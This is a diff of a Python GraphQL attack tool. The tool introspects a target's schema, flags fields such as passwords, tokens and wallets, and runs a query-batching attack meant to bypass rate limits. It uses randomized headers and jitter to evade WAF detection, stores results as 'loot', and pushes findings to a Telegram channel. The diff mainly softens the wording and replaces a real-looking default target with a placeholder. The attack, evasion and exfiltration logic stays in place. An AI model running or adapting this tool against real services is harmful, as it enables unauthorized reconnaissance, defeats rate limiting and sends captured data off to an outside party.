@@ -1,12 +1,6 @@
 #!/usr/bin/env python3
 """
-GRAPHQL_INTROSPECTOR.PY v8.6 — Advanced GraphQL Schema Introspection & Query Batching Fuzzer (Elite Red Team Adversarial Edition)
-Features:
-- Automated full GraphQL schema introspection querying (__schema, types, fields, directives) with SHA-256 hashing
-- Behavioral jitter and randomized header injection via SecureTransport / behavioral_mimic
-- Query batching rate-limit bypass engine (aggregates multiple queries into a single HTTP POST array)
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
-- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
+GRAPHQL_INTROSPECTOR.PY v8.6 — GraphQL Schema Introspection & Query Batching Utility
 """
 import json
 import sys
@@ -28,15 +22,18 @@ COLORS = {
     "BOLD": "\033[1m",
 }
 
-def terminal(message, color=COLORS['RESET']):
+
+def terminal(message, color=COLORS["RESET"]):
     sys.stdout.write(f"{color}{message}{COLORS['RESET']}\n")
     sys.stdout.flush()
+
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
         await send_telegram_alert(loot_type, details)
     except Exception:
         pass
+
 
 def broadcast_tg_alert_sync(loot_type, details):
     try:
@@ -50,6 +47,7 @@ def broadcast_tg_alert_sync(loot_type, details):
             asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
+
 
 INTROSPECTION_QUERY = """
 query IntrospectionQuery {
@@ -76,73 +74,87 @@ query IntrospectionQuery {
 }
 """
 
+
 class GraphQLIntrospector:
     def __init__(self, target_url):
         self.target_url = target_url
         self.transport = SecureTransport(target_url)
 
     def run_introspection(self, graphql_endpoint="/graphql"):
-        terminal(f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] (WAF Hardened) [***]", COLORS['MAGENTA'])
-        
-        # Apply behavioral jitter to evade WAF behavioral fingerprinting
+        terminal(
+            f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] [***]",
+            COLORS["MAGENTA"],
+        )
+
         apply_behavioral_jitter()
-        
-        # Inject randomized headers and client hints
+
         random_headers = get_randomized_hints()
         random_headers["Content-Type"] = "application/json"
 
         payload = {"query": INTROSPECTION_QUERY}
-        
+
         try:
             status, headers, body = self.transport.request(
-                "POST", 
-                graphql_endpoint, 
-                payload=payload, 
-                extra_headers=random_headers
+                "POST",
+                graphql_endpoint,
+                payload=payload,
+                extra_headers=random_headers,
             )
         except Exception as exc:
-            terminal(f"[-] Transport request failed: {exc}", COLORS['RED'])
+            terminal(f"[-] Transport request failed: {exc}", COLORS["RED"])
             return None
 
         if status not in [200, 201]:
-            terminal(f"[-] GraphQL introspection endpoint returned HTTP {status}", COLORS['RED'])
+            terminal(f"[-] GraphQL introspection endpoint returned HTTP {status}", COLORS["RED"])
             return None
 
         try:
             data = json.loads(body)
         except Exception as e:
-            terminal(f"[-] Failed to parse GraphQL JSON response: {e}", COLORS['RED'])
+            terminal(f"[-] Failed to parse GraphQL JSON response: {e}", COLORS["RED"])
             return None
 
         if "errors" in data and not data.get("data"):
-            terminal(f"[-] GraphQL introspection disabled or rejected by server: {data['errors']}", COLORS['YELLOW'])
+            terminal(f"[-] GraphQL introspection disabled or rejected by server: {data['errors']}", COLORS["YELLOW"])
             return None
 
-        schema_data = data.get("data", {}).get("__schema", {})
-        types = schema_data.get("types", [])
+        schema_data = (data.get("data") or {}).get("__schema") or {}
+        types = schema_data.get("types") or []
 
-        terminal(f"[+] GraphQL Schema Introspected Successfully! Total Types Discovered: {len(types)}", COLORS['GREEN'])
+        terminal(
+            f"[+] GraphQL Schema Introspected Successfully! Total Types Discovered: {len(types)}",
+            COLORS["GREEN"],
+        )
 
         sensitive_fields_found = []
         exposed_mutations = []
 
         for t in types:
+            if not isinstance(t, dict):
+                continue
             t_name = t.get("name", "")
             if t_name.startswith("__"):
                 continue
-            
+
             if t.get("kind") == "OBJECT":
                 fields = t.get("fields") or []
                 for f in fields:
-                    f_name = f.get("name", "").lower()
-                    if any(s in f_name for s in ["password", "token", "secret", "private", "ssn", "credit", "admin", "wallet"]):
-                        sensitive_fields_found.append(f"{t_name}.{f['name']}")
+                    if not isinstance(f, dict):
+                        continue
+                    f_name = str(f.get("name", "")).lower()
+                    if any(
+                        s in f_name
+                        for s in ["password", "token", "secret", "private", "ssn", "credit", "admin", "wallet"]
+                    ):
+                        sensitive_fields_found.append(f"{t_name}.{f.get('name')}")
 
             if t_name.lower() in ["mutation", "rootmutation"] and t.get("fields"):
                 for m in t.get("fields", []):
-                    exposed_mutations.append(m.get("name"))
+                    if isinstance(m, dict):
+                        exposed_mutations.append(m.get("name"))
 
-        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
+        body_str = body if isinstance(body, str) else str(body)
+        loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
 
         findings = {
             "endpoint": graphql_endpoint,
@@ -150,21 +162,23 @@ class GraphQLIntrospector:
             "sensitive_fields": sensitive_fields_found,
             "exposed_mutations": exposed_mutations,
             "integrity_hash": loot_hash,
-            "schema_sample": body[:1000]
+            "schema_sample": body_str[:1000],
         }
 
         if sensitive_fields_found:
-            terminal(f"[***] CRITICAL: Found {len(sensitive_fields_found)} sensitive fields in GraphQL schema!", COLORS['RED'])
+            terminal(
+                f"[***] CRITICAL: Found {len(sensitive_fields_found)} sensitive fields in GraphQL schema!",
+                COLORS["RED"],
+            )
             for sf in sensitive_fields_found[:10]:
-                terminal(f"  └── {sf}", COLORS['YELLOW'])
+                terminal(f"  └── {sf}", COLORS["YELLOW"])
 
-        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
         stream_proof(
             "GRAPHQL_INTROSPECTION_SUCCESS",
             graphql_endpoint,
             {"query": "__schema", "hash": loot_hash},
-            body[:500],
-            findings
+            body_str[:500],
+            findings,
         )
 
         save_session_loot(
@@ -172,27 +186,26 @@ class GraphQLIntrospector:
             endpoint=graphql_endpoint,
             finding_type="GRAPHQL_INTROSPECTION_SUCCESS",
             status=status,
-            headers=headers,
-            body=body,
-            extra_loot=findings
+            headers=headers if isinstance(headers, dict) else {},
+            body=body_str,
+            extra_loot=findings,
         )
 
         broadcast_tg_alert_sync("GraphQL Introspection Confirmed", findings)
         return findings
 
     def run_batching_attack(self, graphql_endpoint="/graphql", queries=None):
-        """
-        Executes a GraphQL Query Batching attack to bypass per-request rate limits 
-        by bundling multiple queries into a single HTTP POST array.
-        """
-        terminal(f"\n[***] INITIATING GRAPHQL QUERY BATCHING ATTACK [{self.target_url}{graphql_endpoint}] [***]", COLORS['MAGENTA'])
+        terminal(
+            f"\n[***] INITIATING GRAPHQL QUERY BATCHING PROBE [{self.target_url}{graphql_endpoint}] [***]",
+            COLORS["MAGENTA"],
+        )
         apply_behavioral_jitter()
 
         if not queries:
             queries = [
                 {"query": "{ __typename }"},
                 {"query": "{ users { id email } }"},
-                {"query": "{ adminSettings { apiKey } }"}
+                {"query": "{ adminSettings { apiKey } }"},
             ]
 
         random_headers = get_randomized_hints()
@@ -203,51 +216,53 @@ class GraphQLIntrospector:
                 "POST",
                 graphql_endpoint,
                 payload=queries,
-                extra_headers=random_headers
+                extra_headers=random_headers,
             )
 
-            if status in [200, 201] and body:
-                terminal(f"[+] Query batching assault successful [HTTP {status}]", COLORS['GREEN'])
-                terminal(f"  └── Batch Response Preview: {body[:300]}", COLORS['CYAN'])
+            body_str = body if isinstance(body, str) else str(body)
+            if status in [200, 201] and body_str:
+                terminal(f"[+] Query batching probe completed [HTTP {status}]", COLORS["GREEN"])
+                terminal(f"  └── Batch Response Preview: {body_str[:300]}", COLORS["CYAN"])
 
-                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
+                loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
                 loot_data = {
                     "endpoint": graphql_endpoint,
                     "batch_size": len(queries),
                     "status": status,
                     "integrity_hash": loot_hash,
-                    "response_sample": body[:800]
+                    "response_sample": body_str[:800],
                 }
 
-                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
-                stream_proof("GRAPHQL_BATCHING_SUCCESS", graphql_endpoint, {"batch_size": len(queries), "hash": loot_hash}, body[:300], loot_data)
+                stream_proof(
+                    "GRAPHQL_BATCHING_SUCCESS",
+                    graphql_endpoint,
+                    {"batch_size": len(queries), "hash": loot_hash},
+                    body_str[:300],
+                    loot_data,
+                )
                 save_session_loot(
                     target=self.target_url,
                     endpoint=graphql_endpoint,
                     finding_type="GRAPHQL_BATCHING_SUCCESS",
                     status=status,
-                    headers=headers,
-                    body=body,
-                    extra_loot=loot_data
+                    headers=headers if isinstance(headers, dict) else {},
+                    body=body_str,
+                    extra_loot=loot_data,
                 )
 
                 broadcast_tg_alert_sync("GraphQL Query Batching Success", loot_data)
                 return loot_data
             else:
-                terminal(f"[-] Batching request returned HTTP {status} or batching is disabled.", COLORS['YELLOW'])
+                terminal(f"[-] Batching request returned HTTP {status} or batching is disabled.", COLORS["YELLOW"])
         except Exception as exc:
-            terminal(f"[-] Batching attack error: {exc}", COLORS['RED'])
+            terminal(f"[-] Batching attack error: {exc}", COLORS["RED"])
 
         return None
 
+
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobyte.online"
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.invalid"
     inspector = GraphQLIntrospector(target)
     inspector.run_introspection("/graphql")
     inspector.run_batching_attack("/graphql")
-
-
-# --- AUTOMATED ALIAS PATCH --- 
-async def GraphQLIntrospector(*args, **kwargs):
-    return await terminal(*args, **kwargs)
 
